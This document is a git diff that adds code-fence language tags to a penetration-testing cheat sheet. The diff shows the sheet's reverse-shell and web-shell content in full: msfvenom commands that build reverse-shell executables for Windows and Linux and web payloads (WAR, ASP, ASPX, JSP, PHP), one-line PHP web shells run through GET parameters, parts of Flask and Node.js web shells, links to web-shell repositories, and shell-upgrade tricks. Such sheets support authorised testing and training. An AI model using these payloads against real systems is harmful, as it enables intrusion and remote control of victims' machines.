@@ -12,76 +12,74 @@ linux/shell/reverse_tcp (staged)
 ## Non-Meterpreter Binaries
 ### Windows
 #### .exe x86 staged - msfvenom (Non-Meterpreter)
-```
+```bash
 msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x86.exe
 ```
 
 #### .exe x64 staged - msfvenom (Non-Meterpreter)
-```
+```bash
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x64.exe
 ```
 
 #### .exe x86 stageless - msfvenom (Non-Meterpreter)
-```
+```bash
 msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x86.exe
 ```
 
 #### .exe x64 stageless - msfvenom (Non-Meterpreter)
-```
+```bash
 msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x64.exe
 ```
 
 ### Linux
 #### .elf x86 staged - msfvenom (Non-Meterpreter)
-```
+```bash
 msfvenom -p linux/x86/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x86.elf
 ```
 
 #### .elf x64 staged - msfvenom (Non-Meterpreter)
-
-```
+```bash
 msfvenom -p linux/x64/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x64.elf
 ```
 
 #### .elf x86 stageless - msfvenom (Non-Meterpreter)
-
-```
+```bash
 msfvenom -p linux/x86/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x86.elf
 ```
 
 #### .elf x64 stageless - msfvenom (Non-Meterpreter)
-```
+```bash
 msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x64.elf
 ```
 
 ## Web Payloads
 ### Java WAR - msfvenom (Non-Meterpreter)
-```
+```bash
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f war > shell.war
 ```
 
 ### ASP - msfvenom (Non-Meterpreter)
-```
+```bash
 msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f asp > shell.asp
 ```
 
 ### ASPX - msfvenom (Non-Meterpreter)
-```
+```bash
 msfvenom -f aspx -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<LPORT> -f aspx > shell.aspx
 ```
 
 ### JSP - msfvenom (Non-Meterpreter)
-```
+```bash
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.jsp
 ```
 
 ### WAR - msfvenom (Non-Meterpreter)
-```
+```bash
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.jsp
 ```
 
 ### PHP - msfvenom (Non-Meterpreter) - Reverse Shell
-```
+```bash
 msfvenom -p php/reverse_php LHOST=<IP> LPORT=<PORT> -f raw > shell.php
 ```
 or  
@@ -90,7 +88,7 @@ https://raw.githubusercontent.com/Dhayalanb/windows-php-reverse-shell/master/Rev
 
 ## Web Shells
 ### PHP 
-```
+```PHP
 <?php echo shell_exec($_GET['cmd']);?>
 <?php system($_GET['cmd']);?>
 <?php echo exec($_GET['cmd']);?>
@@ -100,7 +98,7 @@ https://raw.githubusercontent.com/Dhayalanb/windows-php-reverse-shell/master/Rev
 https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmdjsp.jsp  
 
 or in kali
-```
+```bash
 locate cmdjsp.jsp
 ```
 ### ASP
@@ -108,7 +106,7 @@ https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/asp/cmd-
 https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/asp/cmdasp.asp  
 
 or in kali
-```
+```bash
 locate cmd-asp-5.1.asp
 locate cmdasp.asp
 ```
@@ -117,12 +115,12 @@ locate cmdasp.asp
 https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/asp/cmdasp.aspx  
 
 or in kali
-```
+```bash
 locate cmdasp.aspx
 ```
 
 ### Webshell Infecting views.py - Python (Flask)
-```
+```python
 import os
 from flask import Flask,request,os
 
@@ -137,8 +135,8 @@ if __name__ == "__main__":
 ```
 https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/webshells/views.py
 
-### nodejs
-```
+### Nodejs
+```node
 const express = require('express')
 const app = express();
 
@@ -158,21 +156,21 @@ https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester
 
 ### Perl
 -> Find and edit
-```
+```bash
 locate perl-reverse-shell.pl
 ```
 
 ## Spawn tty via Python
-```
+```bash
 python -c 'import pty;pty.spawn("/bin/bash")';
 ```
 
 ## Spawn an upgraded shell
-```
+```bash
 export TERM=xterm && /usr/bin/script -qc /bin/bash /dev/null 
 ```
 `ctrl + z`
-```
+```bash
 stty raw -echo; fg 
 ```
 
